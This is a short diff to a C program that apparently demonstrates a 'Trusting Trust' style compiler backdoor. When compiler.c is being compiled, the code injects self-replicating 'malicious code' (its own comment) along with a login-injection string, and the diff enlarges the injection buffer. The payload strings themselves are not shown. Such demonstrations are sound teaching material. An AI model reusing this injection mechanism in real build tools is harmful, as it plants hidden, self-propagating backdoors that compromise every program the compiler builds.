@@ -99,7 +99,7 @@ int main(int argc, char *argv[]){
 	"%c}%c%c"
 	"%cconst char * TEXT_INJECT_COMPILER = %c%s%c;%c%c"
 	"%cif(strstr(sourceFilename, %ccompiler.c%c) != NULL){%c"
-		"%c%cchar stringToInject[5000];%c"
+		"%c%cchar stringToInject[10000];%c"
 		"%c%csprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);%c"
 		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
 		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
@@ -116,7 +116,7 @@ int main(int argc, char *argv[]){
 
 	if(strstr(sourceFilename, "compiler.c") != NULL){
 
-		char stringToInject[5000];
+		char stringToInject[10000];
 
 		//Generate malicious code
 		sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);
